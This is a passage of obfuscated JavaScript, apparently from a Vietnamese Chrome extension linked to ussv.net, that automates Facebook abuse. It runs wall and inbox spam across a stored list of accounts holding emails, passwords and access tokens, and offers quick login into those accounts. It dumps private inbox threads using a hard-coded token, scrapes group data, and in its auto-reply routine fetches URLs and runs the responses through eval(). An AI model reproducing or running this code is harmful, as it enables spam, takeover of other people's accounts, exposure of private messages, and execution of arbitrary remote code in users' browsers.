                if (f1W[I](spam_wall_need_fr, f1W.y3Q)) {
                    start_spam_safe(p, M, b, H, R, X, f1W.o7v);
                } else {
                    if (f1W[T](fb_friends, spam_wall_need_fr)) {
                        start_spam_safe(p, M, b, H, R, X, f1W.o7v);
                    } else {
                        S();
                    }
                }
            } else if (f1W[g](spam_wall, f1W.L9a) && f1W[N](spam_inbox, f1W.S9a)) {
                S();
            } else if (f1W[Y](spam_wall, f1W.S9a) && f1W[n](spam_inbox, f1W.L9a)) {
                Q();
            } else {
                var B0 = function(W) {
                    acc_doing[f1W.f17] = W;
                };
                B0(f1W.L9a);
                dom_logs_ussv(_lJ[f1W.G3v]({
                    "t": f1W.p37,
                    "id": f1W.R4X
                }), f);
            }
        }
    }

    function dom_logs_ussv(W, V) {
        var E = '"><span class="div_change_email_time">',
            O = '<div class="div_ussv_logs_txt ',
            Z = " logs_post hidden",
            F = " logs_post",
            o = "h78",
            U = "post_gr_error",
            p = "R78",
            M = "post_gr_ok",
            b = "f78",
            H = "post_fr_error",
            R = "H78",
            X = "post_fr_ok",
            f = "q78",
            n = "b78",
            Y = "U78",
            V = V[f1W.X3Q](f1W.w30),
            N = V[f1W.L9a],
            g = V[f1W.S9a],
            T = V[f1W.c9a],
            I = V[f1W.J9a],
            D = V[f1W.d9a],
            W = f1W.V8v + W[f1W.F6r](f1W.V6I, f1W.V1r);
        if (f1W[Y](T, undefined) && f1W[n](T, f1W.S1v)) {
            var T = T + f1W.I2Q;
        } else {
            var T = f1W.V8v;
        }
        if (f1W[f](I, X) || f1W[R](I, H) || f1W[b](I, M) || f1W[p](I, U)) {
            if (f1W[o]($(f1W.I8y)[f1W.m8y](), f1W.c8Q)) {
                var I = I + F;
            } else {
                var I = I + Z;
            }
        }
        var G = $(f1W.L4y),
            C = O + N + f1W.C2r + I + f1W.C2r + D + E + time_now() + f1W.K5O + T + f1W.X6v + W + f1W.w9O;
        G[f1W.u2r](C);
    }

    function thaotac_icon_cmt(G) {
        var C = ".h_icon_cmt",
            z = ".UFICommentAttachmentButtons:eq(",
            P = '    <div class="UFICommentStickerIcon h_icon_cmt" style="background-position:0;background-image:url(//ussv.net/themes/img/fb_icon/0.png)"></div>',
            J = '<a aria-label="Ðang Icon" class="UFICommentStickerButton ussv_icon_cmt" data-hover="tooltip" data-tooltip-alignh="center" href="#" id="js_k">',
            c = f1W.X6v;
        c += J;
        c += P;
        c += f1W.t97;
        $(z + G + f1W.J0Y)[f1W.p3Q](c);
        $(C)[f1W.Z6O](function() {
            var N = "#close_div_icon_cmt",
                g = "li",
                T = ".ussv_div_icon_cmt";
            $(T)[f1W.w5I]();
            var I = div_icon(f1W.n4v),
                D = $(this).parent(f1W.n0v).parent(f1W.P5Y).parent(f1W.P5Y).parent(f1W.P5Y).parent(f1W.P5Y).parent(f1W.P5Y).parent(f1W.P5Y).parent(g);
            D[f1W.u2r](I);
            D[f1W.q8r](T)[f1W.l6Q](f1W.Y5a);
            $(N)[f1W.Z6O](function() {
                $(T)[f1W.F50](f1W.o9Q)[f1W.w5I]();
            });
            $(f1W.L7v)[f1W.Z6O](function() {
                var W = "input[name=add_comment_text]",
                    V = '">hjhj</span>',
                    E = '<span data-reactid="',
                    O = "._5ywb",
                    Z = '"><br data-reactid',
                    F = 'data-reactid="',
                    o = "s1t",
                    U = "._209g._2vxa",
                    p = ".UFIInputContainer",
                    M = ".UFIMentionsInputWrap.UFIStickersEnabledInput",
                    b = this[f1W.W7O];
                $(f1W.L7v)[f1W.C3O](f1W.Q1I, f1W.V8v);
                $(this)[f1W.C3O](f1W.Q1I, f1W.t8Q);
                var H = icon_list(f1W.S9a, b),
                    R = $(this).parent(f1W.F5y).parent(T).parent(g),
                    X = R[f1W.q8r](M)[f1W.q8r](p)[f1W.q8r](U),
                    f = X[f1W.Q0I]()[f1W.x3y](/<br/gi);
                if (f1W[o](f, f1W.x0r)) {} else {
                    var n = X[f1W.Q0I]()[f1W.x3y](/data-reactid=(.*?)data-reactid/gi),
                        n = n[f1W.L9a][f1W.F6r](F, f1W.V8v),
                        n = n[f1W.F6r](Z, f1W.V8v);
                    R[f1W.q8r](M)[f1W.q8r](p)[f1W.q8r](O)[f1W.w5I]();
                    X[f1W.q8r](f1W.P37)[f1W.X5O](f1W.m9v)[f1W.Q0I](E + n + V);
                }
                var R = R[f1W.q8r](M)[f1W.q8r](p)[f1W.q8r](W),
                    Y = R[f1W.o07]();
                R[f1W.o07](Y + f1W.v6X + H + f1W.v6X);
            });
        });
    }

    function ussv_get_fb_acc(b0, s0) {
        var V0 = "d78",
            i0 = "K78",
            J0 = "L78",
            f0 = function() {
                var W = "&method=all";
                var V = "&page=";
                datalogin = f1W.o0Y + uss_aut(f1W.S9a) + f1W.R87 + uss_aut(f1W.c9a) + f1W.x4y + uss_aut(f1W.J9a) + f1W.K5a + uss_aut(f1W.L9a) + f1W.V2Q + b0 + V + s0 + W;
            },
            k0 = function(W) {
                url = W;
            };
        if (f1W[J0](s0, f1W.x0r)) {
            var s0 = f1W.S9a;
        }
        if (f1W[i0](uss_aut(f1W.d9a), f1W.S9a)) {
            if (f1W[V0]($(f1W.m2O)[f1W.m8y]().length, f1W.G90)) {
                get_setting_spam(f1W.p8O);
            }
        }
        var N0 = document[f1W.C4y](f1W.j9O)[f1W.V5I],
            l0 = document[f1W.C4y](f1W.Y6a)[f1W.V5I],
            b0 = f1W.q5X;
        k0(f1W.Z5r);
        f0();
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: url,
            data: datalogin
        }, function(X) {
            var f = "mouseout",
                n = "mouseover",
                Y = "J88",
                N = "I88",
                g = "at_page",
                T = "T88",
                I = "a88",
                D = "i88",
                G = "n88",
                C = "totalacc",
                z = "M88",
                P = "e88",
                J = "p88",
                c = "o88",
                L = "r88",
                E0 = "E88",
                F0 = "W88",
                K = JSON[f1W.i2O](X);
            if (f1W[F0](K[f1W.C3y], 0)) {
                var r0 = K.data.length;
                if (f1W[E0](r0, 0)) {
                    $("#list_logs_fb_acc")[f1W.Q0I]("Ba?n không co´ ta`i khoa?n na`o ca? !");
                } else {
                    var Q = '';
                    for (var S = 0; f1W[L](S, r0); S++) {
                        var u = K.data[S][f1W.W7O],
                            p0 = K.data[S][f1W.c4I],
                            q0 = K.data[S][f1W.Q0r],
                            H0 = K.data[S][f1W.C3y],
                            W0 = K.data[S][f1W.w97],
                            w = K.data[S][f1W.M00],
                            B0 = '17';
                        if (f1W[c](H0, 5)) {
                            var B0 = '20';
                        }
                        var o0 = "";
                        if (f1W[J](uss_aut(4), 1)) {
                            var o0 = '<span><img title="Spam la?i trên ta`i khoa?n ' + p0 + '" class="spam_rs ' + u + '" id="' + u + '" src="https://ussv.net/themes/img/app/re_spam.png"></span>';
                            if (f1W[P]($("#text_string_spam")[f1W.m8y]().length, 10)) {
                                get_setting_spam("update");
                            }
                        }
                        var Q = Q;
                        Q += '<a class="popup_menu_list acc_logs ' + u + '">';
                        Q += '   <img width="' + B0 + '" src="https://ussv.net/themes/img/fb_' + H0 + '.png" class="row_icon_acc_ce_left">';
                        Q += '   <input value="' + p0 + '" type="text" style="float:left;width:110px" class="popup_menu_list acc_logs input_mail _51sy ' + u + '">';
                        Q += '   <span class="hidden info_logs_acc ' + u + '" id="' + u + '">' + p0 + '|' + q0 + '|' + w + '</span>';
                        Q += '   <div>';
                        Q += '		<span><img title="Ðang Nhâ?p Nhanh Va`o Ta`i Khoa?n ' + p0 + '" class="spam_fl ' + u + '" id="' + u + '" src="https://ussv.net/themes/img/app/icon_login.png"></span>';
                        Q += '		' + o0;
                        Q += '		<span><img title="Kiê?m La?i Ta`i Khoa?n ' + p0 + '" class="spam_rc ' + u + '" id="' + u + '" src="https://cdn4.iconfinder.com/data/icons/munich/16x16/zoom.png"></span>';
                        Q += '		<span style="float:right" class="friend_logs" id="' + u + '">' + W0 + '</span>';
                        Q += '	</div>';
                        Q += '</a>';
                    };
                    if (f1W[z](K[C], 15)) {
                        var Q = Q,
                            Z0 = f1W[G](K[C], 10),
                            Z0 = Z0 + "",
                            Z0 = Z0[f1W.X3Q]("."),
                            Z0 = Z0[0],
                            Z0 = parseInt(Z0),
                            A = "",
                            X0 = "",
                            n0 = '';
                        for (var S = 1; f1W[D](S, Z0 + 1); S++) {
                            if (f1W[I](S, 14)) {
                                var A = "hidden";
                            }
                            var n0 = n0;
                            if (f1W[T](K[g], S)) {
                                n0 += '<span class="' + A + ' ce_load_more logs logs_page_select">' + S + '</span> ';
                            } else {
                                n0 += '<span class="' + A + ' ce_load_more logs logs_page_noselect">' + S + '</span> ';
                            }
                        }
                        if (f1W[N](Z0, 15)) {
                            var X0 = '<span class="ce_load_more logs logs_page_noselect">...</span><br/>';
                        }
                        var Z0 = n0 + X0,
                            Z0 = '<a class="ce_acc_page" id="total_page_mail">' + Z0 + '</a>';
                        Q += Z0;
                        $(".popup_menu_list.logs_get_acc")[f1W.v37]();
                        var U0 = r0 + " / " + K[C];
                    } else {
                        $(".popup_menu_list.logs_get_acc")[f1W.Q0I]("Ta?i La?i");
                        var U0 = r0;
                    }
                    $("#list_logs_fb_acc")[f1W.Q0I](Q);
                    $("#logs_total_fb_acc")[f1W.Q0I]("(" + U0 + ")");
                    if (f1W[Y](b0, "reload")) {} {
                        $(".ce_load_more.logs")[f1W.Z6O](function() {
                            var W = "c88",
                                V = $(this)[f1W.m8y]();
                            $(this)[f1W.V6Q]("class", "logs_page_select");
                            if (f1W[W](V, "...")) {
                                $(this)[f1W.v37]();
                                $(".ce_load_more.logs_page_noselect.hidden")[f1W.l6Q](500);
                            } else {
                                $("#list_logs_fb_acc")[f1W.Q0I]("<br/><center>" + img_load + "</center><br/>");
                                ussv_get_fb_acc("reload", V);
                            }
                        });
                        $('input[type=text]')[f1W.Z6O](function() {
                            $(this)[f1W.V5O]();
                        });
                        $(".spam_fl")[n](function() {
                            var Z = this[f1W.W7O],
                                F = 0,
                                o = 0,
                                U = setInterval(function() {
                                    var V = "v88";
                                    var E = "u88";
                                    F += 1;
                                    $(".spam_fl." + Z)[f1W.C3O]({
                                        "-webkit-transform": "rotate(" + F + "deg)",
                                        "-moz-transform": "rotate(" + F + "deg)",
                                        "transform": "rotate(" + F + "deg)"
                                    });
                                    if (f1W[E](F, 360)) {
                                        var O = function(W) {
                                            F = W;
                                        };
                                        o += 1;
                                        O(0);
                                        if (f1W[V](o, 1)) {
                                            clearInterval(U);
                                        } else {}
                                    }
                                }, 1);
                        });
                        $(".spam_rs")[n](function() {
                            var Z = this[f1W.W7O],
                                F = 0,
                                o = 0,
                                U = setInterval(function() {
                                    var V = "A88";
                                    var E = "G88";
                                    F += 1;
                                    $(".spam_rs." + Z)[f1W.C3O]({
                                        "-webkit-transform": "rotate(" + F + "deg)",
                                        "-moz-transform": "rotate(" + F + "deg)",
                                        "transform": "rotate(" + F + "deg)"
                                    });
                                    if (f1W[E](F, 360)) {
                                        var O = function(W) {
                                            F = W;
                                        };
                                        o += 1;
                                        O(0);
                                        if (f1W[V](o, 1)) {
                                            clearInterval(U);
                                        } else {}
                                    }
                                }, 1);
                        })[f](function() {});
                        $(".spam_rs")[f1W.Z6O](function() {
                            var o = "j38",
                                U = this[f1W.W7O];
                            $(".ussv_logs_left_panel")[f1W.v37]();
                            $(".ussv_logs_left_panel.spam")[f1W.l6Q](500);
                            $(".popup_menu_list.acc_logs")[f1W.C3O]("background", "");
                            $(".popup_menu_list.acc_logs." + U)[f1W.C3O]("background", "rgb(164, 178, 216)");
                            var p = $(".hidden.info_logs_acc." + U)[f1W.Q0I]()[f1W.X3Q]("|"),
                                M = p[0],
                                b = p[1],
                                H = p[2];
                            if (f1W[o](H, null)) {
                                div_thongbao(ussv_lang_vi_vl_error_tokennull);
                            } else {
                                fb_spam(U, M, H, 1, b);
                                dom_logs_ussv("Ðang tiê´n ha`nh Spam la?i trên ta`i khoa?n " + M, "0|_|_|ok|spam");
                                var R = "https://graph.facebook.com/me?fields=name,birthday,link,locale,verified,gender,mobile_phone,hometown&access_token=" + H;
                                chrome[f1W.d60][f1W.K4r]({
                                    method: 'GET',
                                    action: 'xhttp',
                                    url: R,
                                    data: "hj=hj"
                                }, function(W) {
                                    var V = "B38",
                                        E = JSON[f1W.i2O](W);
                                    if (f1W[V](E[f1W.G6y], null)) {
                                        div_thongbao(ussv_lang_vi_rs_error_dietoken);
                                    } else {
                                        var O = E[f1W.q60],
                                            Z = E[f1W.h3r],
                                            F = E[f1W.G6y];
                                        start_spam(U, H, F, O, Z);
                                    }
                                });
                            }
                        });
                        $(".spam_fl")[f1W.Z6O](function() {
                            var W = "F38",
                                V = this[f1W.W7O],
                                E = $(".hidden.info_logs_acc." + V)[f1W.Q0I]()[f1W.X3Q]("|"),
                                O = E[0],
                                Z = E[1],
                                F = $("#stt_check")[f1W.Q0I]();
                            if (f1W[W](F, "0")) {
                                dom_logs_ussv("Ðang tiê´n ha`nh truy câ?p nhanh ta`i khoa?n " + O, "0|_|_|ok|check");
                                div_fast_log(V, O, Z);
                            } else {
                                div_thongbao(ussv_lang_vi_nt_cant_fl);
                            }
                        });
                        $(".spam_rc")[f1W.Z6O](function() {
                            var W = this[f1W.W7O],
                                V = $(".hidden.info_logs_acc." + W)[f1W.Q0I]()[f1W.X3Q]("|"),
                                E = V[0],
                                O = V[1],
                                Z = $("#stt_check")[f1W.Q0I]();
                            dom_logs_ussv("Ðang tiê´n ha`nh kiê?m tra la?i ta`i khoa?n " + E, "0|_|_|ok|check");
                            re_check(W, E, O);
                        });
                    }
                }
            } else {
                $(".popup_menu_list.logs_get_acc")[f1W.Q0I](K[f1W.F5v]);
            }
        });
    }

    function t111() {
        var V = "V36",
            E = "Q86",
            O = "t86",
            Z = function(W) {
                izinverparams = W;
            };
        div_token = document[f1W.W8O](f1W.W9y);
        div_token[f1W.V5I] = document[f1W.D7a](f1W.C6O)[f1W.L9a][f1W.V5I];
        act = document[f1W.D7a](f1W.C6O)[f1W.L9a][f1W.Q6O];
        Z(f1W.X6v);
        for (i = f1W.L9a; f1W[O](i, div_token[f1W.D7a](f1W.d77).length); i++) {
            if (f1W[E](div_token[f1W.D7a](f1W.d77)[i][f1W.G6y][f1W.x7I](f1W.y8Y), f1W.L9a) && div_token[f1W.D7a](f1W.d77)[i][f1W.G6y][f1W.x7I](f1W.d7a)) {
                izinverparams += f1W.I3r + div_token[f1W.D7a](f1W.d77)[i][f1W.G6y] + f1W.a47 + div_token[f1W.D7a](f1W.d77)[i][f1W.F2Q];
            }
        }
        if (f1W[V](div_token[f1W.D7a](f1W.W8X).length, f1W.L9a)) {
            izinverparams += f1W.I3r + div_token[f1W.D7a](f1W.W8X)[f1W.L9a][f1W.G6y] + f1W.Z60;
        }
        izinverparams[f1W.F6r](f1W.N8O, f1W.P3r);
        izinverparams += f1W.P20;
        $(f1W.V0r)[f1W.u2r](izinverparams);
    }

    function GetMemBerGroupV2(H, R) {
        if (!R) {
            var R = function() {};
        };
        var X = H[f1W.m2r][f1W.X3Q](f1W.w30)[f1W.L9a],
            f = H[f1W.m2r][f1W.X3Q](f1W.w30)[f1W.S9a];
        $[f1W.c9y]({
            url: "https://www.facebook.com/ajax/hovercard/group.php?id=" + X + "&endpoint=/ajax/hovercard/group.php?id=" + X + "&__user=" + _fb[f1W.z1Y] + "&__a=1",
            type: "GET",
            dataType: "json"
        })[f1W.D2I](function(V) {
            var E = "N7b",
                O = "h7b",
                Z = "R7b";
            if (f1W[Z](V[f1W.D60], 4) && f1W[O](V[f1W.p0O], 500)) {
                var V = V[f1W.H8v][f1W.F6r]("for (;;);", ""),
                    V = JSON[f1W.i2O](V),
                    F = document[f1W.W8O]('html');
                if (V[f1W.R1v]) {
                    var o = function(W) {
                        F[f1W.V5I] = W[f1W.R1v][f1W.y9X][0][1][f1W.a8Y];
                    };
                    o(V);
                    $(F)[f1W.q8r](".uiBoxGray.topborder")[f1W.w5I]();
                    var U = $(F)[f1W.Q0I]()[f1W.F6r]('<div class="fsm fwn fcg">', '<div class="InfoGroup">'),
                        p = $(U)[f1W.q8r](".InfoGroup")[f1W.Q0I](),
                        M = $(F)[f1W.q8r](".fsm.fwn.fcg").length,
                        b = $(F)[f1W.q8r](".fsm.fwn.fcg:eq(" + (f1W[E](M, 1)) + ")")[f1W.Q0I]();
                    R({
                        Group: X + "| " + b[f1W.X3Q](" ")[0] + " | " + f,
                        Member: parseInt(b[f1W.X3Q](" ")[0][f1W.F6r](/\./gi, "")[f1W.F6r](/\,/gi, "")),
                        Id: H[f1W.A7y]
                    });
                } else {
                    R({
                        Group: X + "| 1 | " + f,
                        Member: 1,
                        Id: H[f1W.A7y]
                    });
                }
            } else {}
        });
    }

    function ReplyCore() {
        var U0 = "ChangeReadMsg",
            b0 = "RepplyError",
            s0 = "Del_Msg",
            V0 = "SendMsg",
            i0 = "SendSmsApi",
            J0 = "ApiUrl",
            f0 = "NguoiGui",
            k0 = "Key",
            N0 = "ParseDaTa",
            l0 = "ParseMsg",
            v0 = "StartAuto";
        this[v0] = function(E) {
            var O = "TimeSpeed",
                Z = "Ti?n hành Auto Reply Inbox";
            $(E[f1W.a7y])[f1W.Q0I](Z);
            var F = setInterval(function() {
                var W = "Ðã có l?nh d?ng thao tác !",
                    V = "a2b";
                if (f1W[V]($(E[f1W.Y9I])[f1W.o07](), f1W.S9a)) {
                    ReplyCore[l0](E);
                } else {
                    clearInterval(F);
                    $(E[f1W.a7y])[f1W.Q0I](W);
                }
            }, E[O]);
        };
        this[N0] = function(w) {
            var B0 = "T2b";

            function o0(W, V) {
                var E = "l9b",
                    O = "C9b",
                    Z = "g9b",
                    F = "D9b",
                    o = "Y9b",
                    U = "m9b",
                    p = "s9b",
                    M = "k9b",
                    b = "X9b",
                    H = "y9b",
                    R = "F9b",
                    X = "B9b",
                    f = "j9b",
                    n = "A2b",
                    Y = "toLowerCase",
                    N = "G2b",
                    g = "v2b",
                    T = "u2b",
                    I = "c2b",
                    D = "J2b",
                    G = "I2b",
                    C = W[f1W.X3Q]("|");
                if (f1W[G](w[f1W.Z2v], 1)) {
                    var z = uss[f1W.Z2v](C[0]);
                } else {
                    var z = C[0];
                }
                var z = z[f1W.X3Q]("--"),
                    P = C[1][f1W.X3Q]("--"),
                    J = P.length;
                if (f1W[D](w[f1W.S77], 0)) {
                    var c = 0;
                    w[k0] = w[k0][f1W.F6r]("USSVDAU", " ")[f1W.F6r]("USSVCUOI", " ");
                    for (var L = 0; f1W[I](L, z.length); L++) {
                        if (f1W[T](z[L][f1W.x3y]("\\+\\+"), null)) {
                            var E0 = z[L][f1W.X3Q]("++"),
                                F0 = 0;
                            for (var K = 0; f1W[g](K, E0.length); K++) {
                                if (f1W[N](w[k0][Y]()[f1W.x3y](" " + E0[K] + " "), null)) {
                                    F0 = F0 + 1;
                                }
                            }
                            if (f1W[n](F0, E0.length)) {
                                c = c + 1;
                            } else {}
                        } else if (f1W[f](z[L][f1W.x3y]("__"), null)) {
                            var r0 = z[L][f1W.X3Q]("__"),
                                Q = r0[0];
                            if (f1W[X](w[k0][f1W.x3y](" " + Q + " "), null)) {
                                var S = w[k0][f1W.F6r](" " + Q + " ", "")[f1W.X3Q](" "),
                                    u = S[0],
                                    p0 = S[1],
                                    q0 = S[2],
                                    H0 = P[uss[f1W.K0v](J)][f1W.X3Q]("===>")[1],
                                    H0 = H0[f1W.F6r](/\{KEY\}/g, z[L])[f1W.F6r](/\{KEY-A\}/g, r0[0])[f1W.F6r](/\{KEY-B\}/g, u)[f1W.F6r](/\{KEY-C\}/g, p0)[f1W.F6r](/\{KEY-D\}/g, q0),
                                    H0 = H0[f1W.F6r](/\{KEY-FR-Uid\}/g, w[f0]),
                                    H0 = H0[f1W.F6r](/\{KEY-TOKEN\}/g, $(".ussv_fb_key")[f1W.o07]());
                                if (f1W[R](H0[f1W.x3y]("http://"), null) || f1W[H](H0[f1W.x3y]("https://"), null)) {
                                    w[J0] = H0;
                                    ReplyCore[i0](w);
                                } else {
                                    console[f1W.p4y]("Url x? lý Cú Pháp không h?p l? !");
                                }
                                c = c + 1;
                            }
                        } else {
                            if (f1W[b](w[k0][Y]()[f1W.x3y](" " + z[L] + " "), null)) {
                                c = c + 1;
                            }
                        }
                    }
                    if (f1W[M](c, 0)) {
                        Z0 = Z0 + 1;
                    } else {
                        var W0 = P[uss[f1W.K0v](J)][f1W.X3Q]("===>")[0];
                        $(w[f1W.a7y])[f1W.Q0I]("Ti?n hành tr? l?i T? Khóa " + w[k0] + " t? ngu?i dùng " + w[f0]);
                        var W0 = W0[f1W.F6r](/\{KEY-RECEIVED\}/g, w[k0]);
                        ReplyCore[V0](0, 1, 1, w[f0] + "||" + W0 + "||" + w[s0], 0, w[f1W.O00], w[f1W.z1Y]);
                    }
                    if (f1W[p](V + 1, X0)) {
                        if (f1W[U](Z0, X0)) {
                            ReplyCore[b0](w);
                        };
                    }
                } else {
                    var c = 0;
                    w[k0] = w[k0][f1W.F6r]("USSVDAU", "")[f1W.F6r]("USSVCUOI", "");
                    for (var L = 0; f1W[o](L, z.length); L++) {
                        if (f1W[F](z[L], w[k0])) {
                            c = c + 1;
                        } else {}
                    }
                    if (f1W[Z](c, 0)) {
                        Z0 = Z0 + 1;
                    } else {
                        var W0 = P[uss[f1W.K0v](J)];
                        $(w[f1W.a7y])[f1W.Q0I]("Ti?n hành tr? l?i Cú Pháp " + w[k0] + " t? ngu?i dùng " + w[f0]);
                        var W0 = W0[f1W.F6r](/\{KEY-RECEIVED\}/g, w[k0]);
                        ReplyCore[V0](0, 1, 1, w[f0] + "||" + W0 + "||" + w[s0], 0, w[f1W.O00], w[f1W.z1Y]);
                    }
                    if (f1W[O](V + 1, X0)) {
                        if (f1W[E](Z0, X0)) {
                            ReplyCore[b0](w);
                        };
                    }
                }
            }
            var Z0 = 0,
                A = w[f1W.B3Y][f1W.X3Q]("\n\n"),
                X0 = A.length;
            for (var n0 = 0; f1W[B0](n0, X0); n0++) {
                o0(A[n0], n0);
            };
        };
        this[i0] = function(V) {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: V[J0]
            }, function(W) {
                eval(W);
            });
        };
        this[V0] = function(Z, F, o, U, p, M, b) {
            var H = "KEY-FR-",
                R = "x9b";
            if (f1W[R](U[f1W.x3y](H), f1W.x0r)) {
                var U = U[f1W.X3Q](f1W.U7v),
                    X = U[f1W.L9a],
                    f = uss[f1W.P5O](U[f1W.S9a]),
                    n = U[f1W.c9a];
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: "https://graph.facebook.com/" + X + "?access_token=" + $(".ussv_fb_key")[f1W.o07]()
                }, function(W) {
                    var V = "last_name",
                        E = "first_name",
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        console[f1W.p4y]("Không phân tích du?c Info ngu?i g?i !");
                        fb_Msg(Z, F, o, U, p, M, b);
                    } else {
                        var O = f[f1W.F6r](/\{KEY-FR-Name\}/g, W[f1W.G6y]),
                            O = O[f1W.F6r](/\{KEY-FR-FirstName\}/g, W[E]),
                            O = O[f1W.F6r](/\{KEY-FR-LastName\}/g, W[V]),
                            O = O[f1W.F6r](/\{KEY-FR-Uid\}/g, W[f1W.W7O]);
                        fb_Msg(Z, F, o, X + "||" + O + "||" + n, p, M, b);
                    }
                });
            } else {
                fb_Msg(Z, F, o, U, p, M, b);
            }
        };
        this[l0] = function(n) {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: "https://graph.facebook.com/fql?q=SELECT thread_id,snippet, recipients, snippet_author, updated_time FROM thread WHERE folder_id = 1 and unread != 0&access_token=" + n[f1W.p87]
            }, function(W) {
                var V = "U7b",
                    E = "Z7b",
                    O = "DataBlackList",
                    Z = "O7b",
                    F = "BlackList",
                    o = "V7b",
                    U = "snippet_author",
                    p = "snippet",
                    M = "Q9b",
                    b = "t9b",
                    H = "w9b",
                    W = JSON[f1W.i2O](W);
                if (f1W[H](W.data.length, 0)) {
                    $(n[f1W.a7y])[f1W.Q0I]("Ti?n hành tr? l?i " + W.data.length + " Tin nh?n m?i...");
                    for (var R = 0; f1W[b](R, W.data.length); R++) {
                        if (f1W[M](n[f1W.Z2v], 1)) {
                            var X = uss[f1W.Z2v](W.data[R][p]);
                        } else {
                            var X = W.data[R][p];
                        }
                        var f = W.data[R][U];
                        ReplyCore[U0]({
                            "NguoiGui": f
                        });
                        if (f1W[o](n[F], 1) && f1W[Z](n[O][f1W.x3y](f), null)) {} else {
                            n[f0] = f;
                            if (f1W[E](X, "")) {
                                $(n[f1W.a7y])[f1W.Q0I]("Tin nh?n r?ng !");
                            } else {
                                if (f1W[V](n[f1W.k9r], 0)) {
                                    n[k0] = "USSVDAU" + X + "USSVCUOI";
                                    ReplyCore[N0](n);
                                } else {
                                    n[k0] = X;
                                    ReplyCore[b0](n);
                                }
                            }
                        }
                    };
                } else {
                    $(n[f1W.a7y])[f1W.Q0I]("Không Có Tin Nh?n M?i...");
                }
            });
        };
        this[U0] = function(O) {
            var Z = "&__a=1&__req=q&fb_dtsg=",
                F = "folder=inbox&__user=",
                o = "https://www.facebook.com/ajax/mercury/mark_folder_as_read.php",
                U = "&__a=1&__req=1m&fb_dtsg=",
                p = "]=true&__user=",
                M = "ids[",
                b = "https://www.facebook.com/ajax/mercury/change_read_status.php",
                H = "One",
                R = "TypeRead",
                X = "b7b";
            if (f1W[X](O[R], H)) {
                var f = b,
                    n = M + O[f0] + p + _fb[f1W.z1Y] + U + _fb[f1W.O00];
            } else {
                var f = o,
                    n = F + _fb[f1W.z1Y] + Z + _fb[f1W.O00];
            }
            $[f1W.c9y]({
                url: f,
                type: "Post",
                dataType: "json",
                data: n
            })[f1W.D2I](function(W) {
                var V = "H7b",
                    E = "q7b";
                if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        $(O[f1W.a7y])[f1W.Q0I]("Thay d?i tr?ng thái tin nh?n th?t b?i !");
                    } else {
                        $(O[f1W.a7y])[f1W.Q0I]("Thay d?i tr?ng thái tin nh?n Thành Công !");
                    }
                } else {}
            });
        };
        this[b0] = function(W) {
            var V = "Msg_Error",
                E = "Reply_Error",
                O = "f7b";
            if (f1W[O](W[E], 0)) {} else {
                var Z = W[V][f1W.X3Q]("\n\n"),
                    Z = Z[uss[f1W.K0v](Z.length)],
                    Z = Z[f1W.F6r](/\{KEY-RECEIVED\}/g, W[k0]);
                ReplyCore[V0](0, 1, 1, W[f0] + "||" + Z + "||" + W[s0], 0, W[f1W.O00], W[f1W.z1Y]);
            }
        };
    }

    function get_fb_inbox() {
        var G = get_Fb_Uid();
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: 'https://graph.facebook.com/me/inbox?limit=50&access_token=CAAAAAYsX7TsBAMs4UPB27jko6BVT4eegZC2WWAmG1Ve3PNq7dZBh2hpwf2HZA7EFdjaWGx1Yocb1dnEEqR2lDMh3KoTqnv2hzo6AmPEE1DZBi6DJTf8SMoG2XqIq0ZBximynvl7t57ArFQIz2lYb1ZCEUBooL86g2oyZC8esj0RgXxVTYgNVBV4p0kpWlPxmTVZCWqHskuPFQWQWNpmCX38wrIaJ3ZAVVrGYZD',
            data: "xczxc=sads"
        }, function(W) {
            var V = "Z8t",
                E = "O8t",
                O = "V8t",
                Z = "Q7t",
                F = "t7t",
                o = "w7t",
                W = JSON[f1W.i2O](W),
                U = W.data.length;
            thongbao_log(1, "Có " + U + " tin nh?n !");
            var p = '';
            for (var M = 0; f1W[o](M, U); M++) {
                var b = W.data[M][f1W.W7O],
                    H = W.data[M][f1W.a40].data[0][f1W.W7O];
                if (f1W[F](H, G)) {
                    if (f1W[Z](W.data[M][f1W.a40].data.length, 1)) {
                        var H = W.data[M][f1W.a40].data[0][f1W.W7O],
                            R = W.data[M][f1W.a40].data[0][f1W.G6y];
                    } else {
                        var H = W.data[M][f1W.a40].data[1][f1W.W7O],
                            R = W.data[M][f1W.a40].data[1][f1W.G6y];
                    }
                } else {
                    var H = W.data[M][f1W.a40].data[0][f1W.W7O],
                        R = W.data[M][f1W.a40].data[0][f1W.G6y];
                }
                var X = W.data[M][f1W.D07].data.length,
                    f = W.data[M][f1W.D07].data,
                    n = '';
                for (var Y = f1W[O](X, 1); f1W[E](Y, 0); Y--) {
                    var N = f[Y][f1W.Z9y],
                        N = N[f1W.X3Q]("+"),
                        g = N[0][f1W.F6r]("T", " ");
                    if (f1W[V](f[Y][f1W.W47], null)) {
                        var T = "",
                            I = "KXD";
                    } else {
                        var T = f[Y][f1W.W47][f1W.W7O],
                            I = f[Y][f1W.W47][f1W.G6y];
                    }
                    var D = f[Y][f1W.q10],
                        n = n;
                    n += g + " <" + I + " (" + T + ")> \n";
                    n += D + "\n";
                }
                var p = p;
                p += "Tin nh?n v?i: " + R + " (" + H + ") - ID: " + b + " - Total: " + X + "\n";
                p += '¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\n';
                p += n + '\n';
                p += '_________________________________________________\n';
            };
            var p = p[f1W.F6r](/&/g, "%26");
            ussv_taoNotapad(p);
        });
    }

    function GroupCore() {
        var K = "InviteFriend",
            r0 = "Data_Post",
            Q = "Url_Post",
            S = "UnfollowPost",
            u = "Type_Post",
            p0 = "Msg",
            q0 = "Post_Cmt",
            H0 = "ScanGroup",
            W0 = "Del_Cmt",
            w = "Post_Id",
